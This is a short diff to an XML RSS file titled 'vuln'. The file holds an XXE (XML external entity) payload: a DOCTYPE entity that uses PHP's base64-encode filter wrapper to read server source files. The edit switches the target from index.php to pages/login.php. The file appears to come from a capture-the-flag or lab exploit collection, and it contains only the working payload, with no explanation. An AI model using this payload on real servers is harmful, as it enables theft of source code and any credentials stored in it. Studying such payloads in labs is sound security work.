@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
-<!DOCTYPE rss [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php" >]>
+<!DOCTYPE rss [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=pages/login.php" >]>
 <rss version="2.0">
   <channel>
     <title>vuln</title>
